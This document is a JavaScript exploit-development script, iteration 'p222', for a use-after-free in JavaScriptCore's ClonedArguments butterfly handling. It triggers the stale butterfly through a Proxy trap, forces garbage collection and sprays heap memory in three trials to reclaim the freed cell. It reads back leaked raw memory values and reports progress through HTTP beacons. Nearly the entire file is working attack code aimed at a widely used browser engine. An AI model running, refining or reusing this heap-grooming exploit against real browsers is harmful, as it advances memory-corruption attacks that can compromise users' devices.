// p222 — ClonedArguments butterfly UAF: GC-aware reclaim
//
// p221 CONFIRMED stale butterfly read works but spray doesn't reclaim.
// ROOT CAUSE: Butterfly::growArrayRight allocates new butterfly via
// vm.auxiliarySpace() but does NOT free the old one. Old butterfly stays
// in GC auxiliary space until collection runs. ArrayBuffer backing stores
// use a DIFFERENT allocator (fastMalloc), so they can never reclaim it.
//
// STRATEGY:
// 1. Trigger UAF (grow butterfly during Proxy trap in copyToArguments)
// 2. Force GC to free old butterfly cell (massive allocation pressure)
// 3. Spray with JSArray butterflies via auxiliary space (same allocator)
// 4. Read stale data — should now contain our spray pattern
//
// bmalloc/TZone sizeClassFor(520) = 544 (growth rate 1.05 from 512)
// So the old 520-byte butterfly cell is in the 544 size class.
// Spray arrays must have butterflies in the SAME size class.
// 64-element butterfly = 8 + 64*8 = 520 bytes → same 544 class.
//
// Beacon prefix: V222-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V222-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 64;

  // ---- HELPERS ----

  // Force GC by creating massive allocation pressure
  // JSC does eden collections after ~1MB of allocation
  // Full collections after ~8MB or memory pressure
  function forceGC() {
    var garbage = [];
    // Create ~16MB of garbage to trigger full collection
    for (var i = 0; i < 200000; i++) {
      garbage.push({ a: i, b: i + 1, c: [i, i + 1] });
    }
    // Release references
    garbage.length = 0;
    garbage = null;
  }

  // ---- TEST A: GC + JSArray butterfly spray ----
  try {
    BS('A-START');
    var trapCount = 0;
    var spray = [];

    var manyArgs = [];
    for (var a = 0; a < NARGS; a++) manyArgs.push(a + 1);
    var args = target.apply(null, manyArgs);

    // Create holes at known positions
    delete args[3];
    delete args[7];
    delete args[11];
    delete args[15];
    delete args[19];

    var trap = {
      get: function(t, prop) {
        trapCount++;
        if (trapCount === 1) {
          BS('A-TRAP-' + prop);

          // Step 1: Force butterfly reallocation
          for (var j = 100; j < 500; j++) args[j] = 0x41;
          BS('A-GREW');

          // Step 2: Force GC to free old butterfly cell
          // Create massive allocation pressure in auxiliary space
          // This should trigger at least an eden collection
          var gcPressure = [];
          for (var g = 0; g < 100000; g++) {
            gcPressure.push([g, g + 1, g + 2, g + 3]);
          }
          // Also create objects (goes through cell space)
          for (var g = 0; g < 50000; g++) {
            gcPressure.push({ x: g, y: g + 1 });
          }
          BS('A-GC-PRESSURE');
          // Release
          gcPressure.length = 0;
          gcPressure = null;

          // Step 3: Spray with JSArray butterflies (same auxiliary space allocator)
          // Each array has 64 elements → butterfly = 520 bytes → size class 544
          // Fill with detectable pattern: 0xBEEF0000 | slot_index
          for (var s = 0; s < 8000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xBEEF0000 | k;
            }
            spray.push(a);
          }
          BS('A-SPRAYED-' + spray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result) {
      BS('A-LEN-' + result.length);

      // Check for BEEF pattern hits (controlled reclaim)
      var beefHits = 0;
      var beefPositions = [];
      for (var r = 0; r < Math.min(result.length, NARGS); r++) {
        var val = result[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xBEEF) {
            beefHits++;
            beefPositions.push(r);
            if (beefHits <= 10) BS('A-HIT-' + r + '=' + hex(u));
          }
        } else if (typeof val === 'object' && val !== null) {
          BS('A-OBJ-' + r);
        }
      }
      BS('A-HITS-' + beefHits);

      // Also dump raw values at ALL hole positions
      var holeIndices = [3, 7, 11, 15, 19];
      for (var h = 0; h < holeIndices.length; h++) {
        var idx = holeIndices[h];
        if (idx < result.length) {
          var v = result[idx];
          var f64 = new Float64Array(1);
          f64[0] = (typeof v === 'number') ? v : 0;
          var u32 = new Uint32Array(f64.buffer);
          var hi = u32[1], lo = u32[0];
          // Compute raw memory value (undo NaN-boxing: raw = ieee754 + 0x0002000000000000)
          // This is the actual 64-bit value in the butterfly memory
          var rawHi = hi;
          var rawLo = lo;
          // Add DoubleEncodeOffset (0x0002000000000000) to get raw memory
          var carry = 0;
          rawLo = lo; // low 32 don't change (DoubleEncodeOffset low32 = 0)
          rawHi = (hi + 0x00020000) >>> 0; // add high32 of offset
          BS('A-RAW' + idx + '=' + hex(rawHi) + '_' + hex(rawLo) + '_T' + typeof v);
        }
      }

      // Dump first few non-original values at non-hole positions
      var nonOrigCount = 0;
      for (var r = 6; r < Math.min(result.length, NARGS); r++) {
        if (r === 7 || r === 11 || r === 15 || r === 19) continue; // skip holes
        var val = result[r];
        if (typeof val === 'number' && val !== (r + 1) && nonOrigCount < 5) {
          nonOrigCount++;
          var f64 = new Float64Array(1);
          f64[0] = val;
          var u32 = new Uint32Array(f64.buffer);
          BS('A-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
        }
      }
      BS('A-NONORIG-' + nonOrigCount);
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Immediate butterfly spray (no GC wait) ----
  // Test if just creating arrays in auxiliary space can reclaim without explicit GC
  try {
    BS('B-START');
    var bTrap = 0;
    var bSpray = [];

    var bArgs = [];
    for (var a = 0; a < NARGS; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    delete args2[3];
    delete args2[7];
    delete args2[11];

    var trap2 = {
      get: function(t, prop) {
        bTrap++;
        if (bTrap === 1) {
          BS('B-TRAP-' + prop);
          // Grow butterfly
          for (var j = 100; j < 500; j++) args2[j] = 0x41;

          // NO explicit GC pressure — just spray immediately
          // The auxiliary space allocator might reclaim from recently swept blocks
          for (var s = 0; s < 8000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xCAFE0000 | k;
            }
            bSpray.push(a);
          }
          BS('B-SPRAYED-' + bSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
    }

    if (result2) {
      BS('B-LEN-' + result2.length);
      var cafeHits = 0;
      for (var r = 0; r < Math.min(result2.length, NARGS); r++) {
        var val = result2[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xCAFE) {
            cafeHits++;
            if (cafeHits <= 10) BS('B-HIT-' + r + '=' + hex(u));
          }
        }
      }
      // Dump hole values
      var bHoles = [3, 7, 11];
      for (var h = 0; h < bHoles.length; h++) {
        var idx = bHoles[h];
        if (idx < result2.length) {
          var v = result2[idx];
          var f64 = new Float64Array(1);
          f64[0] = (typeof v === 'number') ? v : 0;
          var u32 = new Uint32Array(f64.buffer);
          BS('B-H' + idx + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof v);
        }
      }
      BS('B-HITS-' + cafeHits);
    }
  } catch (e) {
    BS('B-OUTER-ERR');
  }

  // ---- TEST C: GC then ArrayBuffer spray for comparison ----
  try {
    BS('C-START');
    var cTrap = 0;
    var cSpray = [];

    var cArgs = [];
    for (var a = 0; a < NARGS; a++) cArgs.push(a + 1);
    var args3 = target.apply(null, cArgs);
    delete args3[3];
    delete args3[7];

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap === 1) {
          BS('C-TRAP-' + prop);
          for (var j = 100; j < 500; j++) args3[j] = 0x41;

          // Force GC
          var gc = [];
          for (var g = 0; g < 150000; g++) gc.push([g, g + 1, g + 2, g + 3]);
          gc.length = 0;
          gc = null;

          // Then ArrayBuffer spray (different allocator — should still NOT reclaim)
          for (var s = 0; s < 6000; s++) {
            var ab = new ArrayBuffer(520);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xDEAD0000 | (k >> 1);
              v[k + 1] = 0xFFFE0000;
            }
            cSpray.push(ab);
          }
          BS('C-SPRAYED-' + cSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);
      var deadHits = 0;
      for (var r = 0; r < Math.min(result3.length, NARGS); r++) {
        var val = result3[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xDEAD) {
            deadHits++;
            BS('C-HIT-' + r + '=' + hex(u));
          }
        }
      }
      BS('C-HITS-' + deadHits);
    }
  } catch (e) {
    BS('C-OUTER-ERR');
  }

  BS('DONE');
})();
